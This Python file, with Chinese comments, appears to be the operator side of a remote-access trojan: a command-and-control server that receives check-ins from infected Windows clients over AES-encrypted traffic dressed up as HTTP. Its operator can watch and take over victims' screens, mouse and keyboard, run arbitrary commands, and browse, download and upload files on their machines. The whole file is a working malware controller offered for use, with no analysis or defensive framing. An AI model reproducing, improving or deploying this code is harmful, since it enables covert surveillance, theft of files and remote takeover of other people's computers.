import asyncio
import base64
import logging
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from PIL import Image, ImageTk
import io
import os
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# 配置日志，调整为 INFO 级别，避免输出 DEBUG 级别的保活消息
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# 配置
HOST = "0.0.0.0"
PORT = 4444
KEY = b"X7K9P2M5Q8R3T6W1"

# 全局变量
clients = {}
clients_lock = asyncio.Lock()
monitor_windows = {}
file_windows = {}
root = None
last_mouse_move = {}
last_keepalive = {}

# AES 加密
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    padded_data = pad(data.encode('utf-8'), AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    encoded = base64.b64encode(encrypted).decode('utf-8')
    return encoded

# AES 解密
def decrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    decoded_data = base64.b64decode(data)
    decrypted = cipher.decrypt(decoded_data)
    unpadded = unpad(decrypted, AES.block_size)
    result = unpadded.decode('utf-8')
    return result

# 读取完整数据
async def read_full_data(reader, expected_len):
    data = b""
    while len(data) < expected_len:
        chunk = await reader.read(expected_len - len(data))
        if not chunk:
            raise ConnectionError("数据读取不完整")
        data += chunk
    return data

# 更新监控窗口
def update_monitor_window(client_id, encrypted_data):
    global root
    try:
        if root is None:
            root = tk.Tk()
            root.withdraw()

        img_data = decrypt_data(encrypted_data, KEY)
        if not img_data:
            logger.error(f"[{client_id}] 截图数据解密失败")
            return

        img_bytes = base64.b64decode(img_data)
        img = Image.open(io.BytesIO(img_bytes))
        orig_width, orig_height = img.size
        scale = min(1200 / orig_width, 800 / orig_height)
        new_width = int(orig_width * scale)
        new_height = int(orig_height * scale)
        img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
        photo = ImageTk.PhotoImage(img)

        if client_id not in monitor_windows:
            window = tk.Toplevel(root)
            window.title(f"Screen Monitor - {client_id}")
            label = tk.Label(window)
            label.pack()
            control_frame = tk.Frame(window)
            control_frame.pack()
            enable_button = tk.Button(control_frame, text="启用控制", command=lambda: enable_control(client_id, window, label))
            enable_button.pack(side=tk.LEFT)
            disable_button = tk.Button(control_frame, text="关闭控制", command=lambda: disable_control(client_id, window, label))
            disable_button.pack(side=tk.LEFT)
            monitor_windows[client_id] = (window, label, False, enable_button, disable_button)
            window.protocol("WM_DELETE_WINDOW", lambda: stop_monitor(client_id, send_command_func=send_command))
        else:
            window, label, _, _, _ = monitor_windows[client_id]

        label.config(image=photo)
        label.image = photo
        root.update()
    except Exception as e:
        logger.error(f"[{client_id}] 更新监控窗口失败: {e}")

# 文件管理窗口
async def open_file_manager(client_id):
    global file_windows, root
    async with clients_lock:
        if not clients:
            messagebox.showerror("错误", "没有可用的客户端")
            return
        if client_id not in clients:
            messagebox.showerror("错误", f"客户端 {client_id} 不存在")
            return

    if client_id in file_windows:
        file_windows[client_id][0].lift()
        return

    window = tk.Toplevel(root)
    window.title(f"File Manager - {client_id}")
    window.geometry("800x600")

    path_var = tk.StringVar(value="C:\\")
    path_entry = tk.Entry(window, textvariable=path_var)
    path_entry.pack(fill=tk.X, padx=5, pady=5)

    tree = ttk.Treeview(window, columns=("Name", "Type"), show="headings")
    tree.heading("Name", text="文件名")
    tree.heading("Type", text="类型")
    tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    async def refresh_files(path=None):
        async with clients_lock:
            if client_id not in clients:
                messagebox.showerror("错误", f"客户端 {client_id} 已断开")
                close_file_window(client_id)
                return

        for item in tree.get_children():
            tree.delete(item)
        current_path = path or path_var.get()
        current_path = current_path.replace("/", "\\").replace("\\\\", "\\")
        if not current_path.endswith("\\"):
            current_path += "\\"
        try:
            result = await asyncio.wait_for(send_command(client_id, f"list_files {current_path}"), timeout=10)
            if result and not result.startswith("Error"):
                path_var.set(current_path)
                for line in result.split("\n"):
                    if line.strip():
                        name, *type_info = line.split()
                        tree.insert("", tk.END, values=(name, "目录" if "<DIR>" in type_info else "文件"))
            else:
                messagebox.showerror("错误", f"无法列出文件: {result or '路径不存在或无权限'}")
        except asyncio.TimeoutError:
            messagebox.showerror("错误", f"请求 {current_path} 超时，客户端可能离线")
        except Exception as e:
            messagebox.showerror("错误", f"获取文件列表失败: {e}")

    def on_double_click(event):
        item = tree.selection()
        if item:
            name, item_type = tree.item(item[0])["values"]
            if item_type == "目录":
                new_path = f"{path_var.get()}{name}\\"
                asyncio.create_task(refresh_files(new_path))

    def on_right_click(event):
        item = tree.identify_row(event.y)
        if item:
            tree.selection_set(item)
            name, item_type = tree.item(item[0])["values"]
            menu = tk.Menu(window, tearoff=0)
            if item_type == "文件":
                menu.add_command(label="下载", command=lambda: download_file(name))
            menu.add_command(label="上传文件到此目录", command=upload_file)
            menu.post(event.x_root, event.y_root)

    def download_file(file_name):
        asyncio.create_task(async_download_file(file_name))

    async def async_download_file(file_name):
        async with clients_lock:
            if client_id not in clients:
                messagebox.showerror("错误", f"客户端 {client_id} 已断开")
                return
        try:
            full_path = f"{path_var.get()}{file_name}"
            result = await asyncio.wait_for(send_command(client_id, f"download_file {full_path}"), timeout=10)
            if result and not result.startswith("Error"):
                save_path = filedialog.asksaveasfilename(initialfile=file_name)
                if save_path:
                    with open(save_path, "wb") as f:
                        f.write(base64.b64decode(result))
                    logger.info(f"[{client_id}] 已下载 {file_name} 到 {save_path}")
            else:
                messagebox.showerror("错误", result or "无法下载文件")
        except asyncio.TimeoutError:
            messagebox.showerror("错误", "下载超时，客户端可能离线")
        except Exception as e:
            messagebox.showerror("错误", f"下载失败: {e}")

    def upload_file():
        asyncio.create_task(async_upload_file())

    async def async_upload_file():
        async with clients_lock:
            if client_id not in clients:
                messagebox.showerror("错误", f"客户端 {client_id} 已断开")
                return
        file_path = filedialog.askopenfilename()
        if file_path:
            try:
                with open(file_path, "rb") as f:
                    content = base64.b64encode(f.read()).decode('utf-8')
                remote_path = f"{path_var.get()}{os.path.basename(file_path)}"
                result = await asyncio.wait_for(send_command(client_id, f"upload_file {remote_path} {content}"), timeout=10)
                if result:
                    logger.info(f"[{client_id}] 上传结果: {result}")
                    await refresh_files()
                else:
                    messagebox.showerror("错误", "上传失败")
            except asyncio.TimeoutError:
                messagebox.showerror("错误", "上传超时，客户端可能离线")
            except Exception as e:
                messagebox.showerror("错误", f"上传失败: {e}")

    button_frame = tk.Frame(window)
    button_frame.pack(fill=tk.X, padx=5, pady=5)
    tk.Button(button_frame, text="刷新", command=lambda: asyncio.create_task(refresh_files())).pack(side=tk.LEFT)
    tk.Button(button_frame, text="返回上级", command=lambda: asyncio.create_task(refresh_files(os.path.dirname(path_var.get())))).pack(side=tk.LEFT)

    tree.bind("<Double-1>", on_double_click)
    tree.bind("<Button-3>", on_right_click)

    file_windows[client_id] = (window, tree, path_var)
    window.protocol("WM_DELETE_WINDOW", lambda: close_file_window(client_id))
    await refresh_files()

def close_file_window(client_id):
    global file_windows
    if client_id in file_windows:
        file_windows[client_id][0].destroy()
        del file_windows[client_id]

# 启用控制模式
def enable_control(client_id, window, label):
    if client_id not in monitor_windows:
        return
    window, label, is_control_enabled, enable_button, disable_button = monitor_windows[client_id]
    if not is_control_enabled:
        label.bind("<Motion>", lambda event: on_mouse_move(client_id, event))
        label.bind("<Button-1>", lambda event: on_mouse_click(client_id, event))
        window.bind("<KeyPress>", lambda event: on_key_press(client_id, event))
        monitor_windows[client_id] = (window, label, True, enable_button, disable_button)
        window.title(f"Screen Monitor - {client_id} (控制中)")
        enable_button.config(state=tk.DISABLED)
        disable_button.config(state=tk.NORMAL)
        logger.info(f"[{client_id}] 控制模式已启用")

# 关闭控制模式
def disable_control(client_id, window, label):
    if client_id not in monitor_windows:
        return
    window, label, is_control_enabled, enable_button, disable_button = monitor_windows[client_id]
    if is_control_enabled:
        label.unbind("<Motion>")
        label.unbind("<Button-1>")
        window.unbind("<KeyPress>")
        monitor_windows[client_id] = (window, label, False, enable_button, disable_button)
        window.title(f"Screen Monitor - {client_id}")
        enable_button.config(state=tk.NORMAL)
        disable_button.config(state=tk.DISABLED)
        logger.info(f"[{client_id}] 控制模式已关闭")

# 鼠标移动事件（节流）
def on_mouse_move(client_id, event):
    if client_id in monitor_windows and monitor_windows[client_id][2]:
        current_time = time.time()
        if client_id not in last_mouse_move or (current_time - last_mouse_move[client_id] >= 0.1):
            x, y = event.x, event.y
            asyncio.create_task(send_command(client_id, f"control mouse_move {x},{y}"))
            last_mouse_move[client_id] = current_time

# 鼠标点击事件
def on_mouse_click(client_id, event):
    if client_id in monitor_windows and monitor_windows[client_id][2]:
        x, y = event.x, event.y
        asyncio.create_task(send_command(client_id, f"control mouse_click {x},{y}"))

# 键盘按下事件
def on_key_press(client_id, event):
    if client_id in monitor_windows and monitor_windows[client_id][2]:
        key = event.char if event.char else event.keysym
        if key:
            asyncio.create_task(send_command(client_id, f"control key_press {key}"))

# 关闭监控窗口
def stop_monitor(client_id, send_command_func=None):
    if client_id in monitor_windows:
        window, _, _, _, _ = monitor_windows[client_id]
        window.destroy()
        del monitor_windows[client_id]
    if send_command_func and client_id in clients:
        asyncio.create_task(send_command_func(client_id, "stop_monitor"))

# 处理客户端
async def handle_client(reader, writer):
    addr = writer.get_extra_info('peername')
    client_id = None
    command_queue = asyncio.Queue()
    result_queue = asyncio.Queue()

    try:
        # 接收上线信息
        data = await asyncio.wait_for(reader.read(4096), timeout=10)
        encrypted_data = data.decode('utf-8', errors='ignore')
        if encrypted_data.startswith("POST /api/update"):
            encrypted_data = encrypted_data.split("\r\n\r\n", 1)[1]

        parts = encrypted_data.split(":", 2)
        if len(parts) != 3 or parts[0] != "C":
            raise ValueError(f"[{addr}] 无效的上线数据格式")
        data_type, data_len_str, encrypted_data = parts
        data_len = int(data_len_str)

        if len(encrypted_data) < data_len:
            remaining_data = await read_full_data(reader, data_len - len(encrypted_data))
            encrypted_data += remaining_data.decode('utf-8', errors='ignore')

        上线信息 = decrypt_data(encrypted_data, KEY)
        if not 上线信息:
            logger.error(f"[{addr}] 上线信息解密失败")
            return
        client_id = 上线信息.split("ID: ")[1].rstrip(")")
        logger.info(f"[{client_id}] 上线: {上线信息}")
        async with clients_lock:
            clients[client_id] = (reader, writer, command_queue, result_queue)
        last_keepalive[client_id] = time.time()

        # 主循环：处理命令和数据
        while True:
            # 检查是否需要发送保活消息
            current_time = time.time()
            if current_time - last_keepalive[client_id] >= 15:
                encrypted_ping = encrypt_data("ping", KEY)
                if encrypted_ping:
                    disguised_ping = f"HTTP/1.1 200 OK\r\nContent-Length: {len(encrypted_ping)}\r\n\r\nC:{len(encrypted_ping)}:{encrypted_ping}"
                    writer.write(disguised_ping.encode())
                    await writer.drain()
                last_keepalive[client_id] = current_time

            command_task = asyncio.create_task(command_queue.get())
            read_task = asyncio.create_task(reader.read(4096))

            done, pending = await asyncio.wait(
                [command_task, read_task],
                return_when=asyncio.FIRST_COMPLETED,
                timeout=10
            )

            if command_task in done:
                command = command_task.result()
                encrypted_command = encrypt_data(command, KEY)
                if not encrypted_command:
                    continue
                disguised_command = f"HTTP/1.1 200 OK\r\nContent-Length: {len(encrypted_command)}\r\n\r\nC:{len(encrypted_command)}:{encrypted_command}"
                writer.write(disguised_command.encode())
                await writer.drain()
                last_keepalive[client_id] = time.time()
                if command.lower() == "exit":
                    await result_queue.put("客户端已退出")
                    stop_monitor(client_id)
                    break

            if read_task in done:
                data = read_task.result()
                if not data:
                    raise ConnectionError("客户端断开")

                encrypted_data = data.decode('utf-8', errors='ignore')
                if encrypted_data.startswith("POST /api/update"):
                    encrypted_data = encrypted_data.split("\r\n\r\n", 1)[1]

                parts = encrypted_data.split(":", 2)
                if len(parts) != 3:
                    logger.error(f"[{client_id}] 无效数据格式")
                    continue
                data_type, data_len_str, encrypted_data = parts
                data_len = int(data_len_str)

                if len(encrypted_data) < data_len:
                    remaining_data = await read_full_data(reader, data_len - len(encrypted_data))
                    encrypted_data += remaining_data.decode('utf-8', errors='ignore')

                if data_type == "C":
                    result = decrypt_data(encrypted_data, KEY)
                    if not result:
                        logger.error(f"[{client_id}] 结果解密失败")
                        continue
                    await result_queue.put(result)
                elif data_type == "S":
                    asyncio.get_event_loop().call_soon_threadsafe(update_monitor_window, client_id, encrypted_data)
                last_keepalive[client_id] = time.time()

            for task in pending:
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass

    except asyncio.TimeoutError:
        logger.warning(f"[{client_id or addr}] 操作超时")
    except Exception as e:
        logger.error(f"[{client_id or addr}] 错误: {e}")
    finally:
        async with clients_lock:
            if client_id and client_id in clients:
                del clients[client_id]
            if client_id in last_keepalive:
                del last_keepalive[client_id]
        stop_monitor(client_id)
        writer.close()
        try:
            await writer.wait_closed()
        except:
            pass
        logger.info(f"[{client_id or addr}] 已断开")

# 发送命令
async def send_command(client_id, command):
    async with clients_lock:
        if client_id not in clients:
            logger.error(f"错误: 客户端 {client_id} 不存在")
            return None
        _, writer, command_queue, result_queue = clients[client_id]

    try:
        while not result_queue.empty():
            await result_queue.get()

        await command_queue.put(command)
        if command.lower() in ["start_monitor", "stop_monitor"]:
            return "命令已发送"
        result = await asyncio.wait_for(result_queue.get(), timeout=15)
        return result
    except asyncio.TimeoutError:
        async with clients_lock:
            if client_id in clients:
                del clients[client_id]
                if client_id in last_keepalive:
                    del last_keepalive[client_id]
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
        logger.error(f"[{client_id}] 获取结果超时，客户端已断开")
        return None
    except Exception as e:
        logger.error(f"[{client_id}] 发送命令失败: {e}")
        return None

# 交互式命令行
async def command_line():
    while True:
        # 简洁输出可用客户端和命令提示
        print("\n可用客户端:")
        async with clients_lock:
            for cid in clients.keys():
                print(f"- {cid}")
        print("命令格式: <客户端ID> <命令> (如: swiss_<UUID> whoami)")
        print("支持: start_monitor / stop_monitor / list_files <path> / download_file <path> / upload_file <path> <base64>")
        print("快捷操作: 'list' 查看客户端，'<客户端ID> filemgr' 打开文件管理，'exit' 退出")

        cmd_input = await asyncio.get_event_loop().run_in_executor(None, input, "> ")
        cmd_input = cmd_input.strip()
        if cmd_input.lower() == "exit":
            break
        elif cmd_input.lower() == "list":
            continue

        try:
            parts = cmd_input.split(" ", 1)
            if len(parts) != 2:
                print("格式错误，请使用: <客户端ID> <命令>")
                continue
            client_id, command = parts
            if command.lower() == "filemgr":
                await open_file_manager(client_id)
            else:
                result = await send_command(client_id, command)
                # 简洁输出结果
                if result:
                    print(result)
                elif command.lower() in ["start_monitor", "stop_monitor"]:
                    print(f"{command} 已发送")
                else:
                    print("无返回结果")
        except Exception as e:
            logger.error(f"命令执行错误: {e}")
        await asyncio.sleep(0.1)

# 集成 Tkinter 和 asyncio
def run_tk(root, loop):
    try:
        root.update()
    except tk.TclError:
        return
    loop.call_later(0.01, run_tk, root, loop)

async def main():
    global root
    server = await asyncio.start_server(handle_client, HOST, PORT)
    logger.info(f"C2 服务器运行在 {HOST}:{PORT}")

    root = tk.Tk()
    root.withdraw()
    loop = asyncio.get_event_loop()
    loop.call_soon(run_tk, root, loop)

    async with server:
        await asyncio.gather(server.serve_forever(), command_line())

if __name__ == "__main__":
    asyncio.run(main())